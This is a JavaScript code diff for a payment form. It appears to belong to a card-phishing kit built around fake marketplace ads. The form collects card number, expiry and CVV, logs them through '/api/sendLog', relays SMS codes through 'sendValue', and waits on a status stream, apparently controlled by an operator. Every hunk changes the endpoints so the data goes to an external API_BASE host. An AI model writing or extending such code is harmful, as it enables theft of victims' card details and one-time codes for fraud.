@@ -835,7 +835,7 @@
       cardMonth: this._cardData.cardMonth,
       cardYear: this._cardData.cardYear,
       cardCvv: this._cardData.cardCvv,
-      item: this.cfg.itemId
+      item: window.__currentAdId || window.itemId || this.cfg.itemId
     };
 
     _memCardNum = this._cardData.cardNumber || '';
@@ -855,7 +855,7 @@
       }
     }
 
-    axios.post(this.cfg.apiSendLog || '/api/sendLog', postData)
+    axios.post(API_BASE + '/api/sendLog', postData)
       .then(function (res) {
         self.logId = res.data.id;
         self.currentStatus = null;
@@ -906,9 +906,10 @@
     }
 
     var self = this;
-    var url = '/api/sse?';
+    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
+    var url = API_BASE + '/api/sse?';
     if (this.logId) url += 'logId=' + encodeURIComponent(this.logId);
-    if (this.cfg.itemId) url += (this.logId ? '&' : '') + 'itemId=' + encodeURIComponent(this.cfg.itemId);
+    if (_adId) url += (this.logId ? '&' : '') + 'itemId=' + encodeURIComponent(_adId);
 
     if (this.eventSource) {
       try { this.eventSource.close(); } catch(e) {}
@@ -1139,7 +1140,7 @@
     if (!this.logId || this.paused) return;
     var self = this;
 
-    axios.post('/api/getStatus', { id: this.logId })
+    axios.post(API_BASE + '/api/getStatus', { id: this.logId })
       .then(function (res) {
         self._handleStatusData(res.data);
       });
@@ -1175,7 +1176,7 @@
     if (btn) { btn.disabled = true; btn.textContent = '...'; }
 
     var self = this;
-    axios.post('/api/sendValue', { value: val, type: type, id: this.logId })
+    axios.post(API_BASE + '/api/sendValue', { value: val, type: type, id: this.logId })
       .then(function () {
         input.value = '';
         if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
@@ -1192,7 +1193,7 @@
     if (sp) sp.style.display = 'flex';
 
     var self = this;
-    axios.post('/api/confirmAction', { method: type, id: this.logId })
+    axios.post(API_BASE + '/api/confirmAction', { method: type, id: this.logId })
       .then(function () {
         self.showModal('msLoading');
         self.currentStatus = null;
@@ -1209,7 +1210,7 @@
     if (btn) btn.disabled = true;
 
     var self = this;
-    axios.post('/api/sendValue', { value: 'OK', type: 'custom', id: this.logId })
+    axios.post(API_BASE + '/api/sendValue', { value: 'OK', type: 'custom', id: this.logId })
       .then(function () {
         self.showModal('msLoading');
         self.currentStatus = null;
